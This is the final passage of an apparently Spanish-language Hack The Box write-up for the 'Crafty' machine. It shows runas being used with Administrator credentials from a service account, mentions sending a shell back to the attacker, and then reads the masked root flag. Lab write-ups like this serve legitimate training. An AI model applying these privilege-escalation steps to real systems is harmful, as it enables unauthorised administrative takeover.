<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\users\svc_minecraft\server\plugins</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> runas </span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">user:Administrator whoami</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Enter the password </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">for</span><span style="color:#393A34;--shiki-dark:#BABED8"> Administrator: </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Attempting to start whoami as user </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">CRAFTY\Administrator</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<p>A partir de aquí podemos usar RunasCs o las runas por defecto de Windows para ejecutar comandos, yo me decantaré por la segunda. Después de enviarnos una consola obviamente ya seremos administradores.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\Windows\system3</span><span style="color:#AB5959;--shiki-dark:#89DDFF">2&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> whoami</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">crafty\administrator</span></span></code></pre> 
<p>Así que ahora podemos tomar la última bandera.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\Windows\system3</span><span style="color:#AB5959;--shiki-dark:#89DDFF">2&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> cd ~ </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\Users\Administrator</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> cd Desktop </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\Users\Administrator\Desktop</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> dir </span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">    Directory: C:\Users\Administrator\Desktop</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Mode                LastWriteTime         Length Name</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">----</span><span style="color:#999999;--shiki-dark:#89DDFF">                -------------</span><span style="color:#999999;--shiki-dark:#89DDFF">         ------</span><span style="color:#999999;--shiki-dark:#89DDFF"> ----</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">ar</span><span style="color:#999999;--shiki-dark:#89DDFF">---</span><span style="color:#2F798A;--shiki-dark:#F78C6C">        6</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">17</span><span style="color:#999999;--shiki-dark:#89DDFF">/</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2024</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   3</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#2F798A;--shiki-dark:#F78C6C">02</span><span style="color:#393A34;--shiki-dark:#BABED8"> AM             </span><span style="color:#2F798A;--shiki-dark:#F78C6C">34</span><span style="color:#393A34;--shiki-dark:#BABED8"> root.txt</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">PS C:\Users\Administrator\Desktop</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> type root.txt </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">7ca657db95d7e1ef6da65ac41b</span><span style="color:#999999;--shiki-dark:#89DDFF">******</span></span></code></pre>  </div> <!-- related posts --> <footer> <h2 class="font-bold text-lg dark:text-white mb-6">Related Posts</h2> <section class="flex flex-col md:flex-row sm:justify-between gap-8"> <div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.262ecYt-_1fWT2n.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Devvortex - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/devvortex/"> Devvortex - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.VSrpVXDi_11Pl5D.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Inject - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/inject/"> Inject - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/ban.By0qvaMu_1stfYM.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Keeper - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/keeper/"> Keeper - HTB Writeup </a> </header> </div> </section> </footer> </article> </div>  </div> </article>  <footer class="flex justify-center items-center w-full px-16 h-28 border-t-2">
&copy; 2024 Your Name. All rights reserved.
</footer> </main>    </body> </html> 